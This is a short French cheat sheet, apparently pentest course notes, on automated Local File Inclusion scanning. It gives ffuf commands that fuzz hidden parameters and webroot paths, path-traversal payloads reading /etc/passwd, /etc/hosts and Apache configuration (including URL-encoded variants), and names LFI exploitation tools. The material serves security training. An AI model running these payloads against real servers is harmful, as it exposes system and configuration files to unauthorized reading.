# Automated Scanning pour LFI

## <mark style="color:red;">**Commandes et Techniques**</mark>

<mark style="color:green;">**1. Fuzzing des Paramètres GET/POST**</mark>

Utilisation de `ffuf` pour identifier des paramètres cachés potentiellement vulnérables :

{% code overflow="wrap" fullWidth="true" %}
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```
{% endcode %}

* **Wordlist utilisée** : `burp-parameter-names.txt`
* **Filtres** : Basés sur la taille des réponses ou les codes HTTP (200, 204, 301, 403, etc.).

***

<mark style="color:green;">**2. Tests LFI avec Wordlists**</mark>

Fuzzing avec des wordlists LFI pour détecter des payloads exploitables :

{% code overflow="wrap" fullWidth="true" %}
```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```
{% endcode %}

* **Wordlist** : `LFI-Jhaddix.txt`
* **Payloads détectés** :
  * `../../../../etc/passwd`
  * `../../../../../etc/hosts`
  * Encodages alternatifs : `..%2F..%2F..%2Fetc%2Fpasswd`

***

<mark style="color:green;">**3. Fuzzing des Fichiers Serveur**</mark>

Recherche des fichiers critiques (webroot, logs, configurations) :

{% code overflow="wrap" fullWidth="true" %}
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```
{% endcode %}

* **Objectif** : Identifier le chemin webroot, ex. : `/var/www/html/`.

***

<mark style="color:green;">**4. Lecture des Fichiers Serveur**</mark>

Lecture de fichiers identifiés pour collecter des informations sensibles :

{% code overflow="wrap" fullWidth="true" %}
```bash
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
```
{% endcode %}

* Exemples de fichiers utiles :
  * `/etc/apache2/apache2.conf` : Contient `DocumentRoot` (webroot) et `ErrorLog`.
  * `/etc/apache2/envvars` : Définit des variables serveur comme `APACHE_LOG_DIR`.

***

<mark style="color:green;">**5. Outils Automatisés pour LFI**</mark>

* **LFISuite** : Automatisation des tests LFI.
* **LFiFreak** : Tests rapides de paramètres vulnérables.
* **liffy** : Scripts de détection/exploitation.

_Remarque_ : Ces outils peuvent être obsolètes (dépendent souvent de Python 2).

***
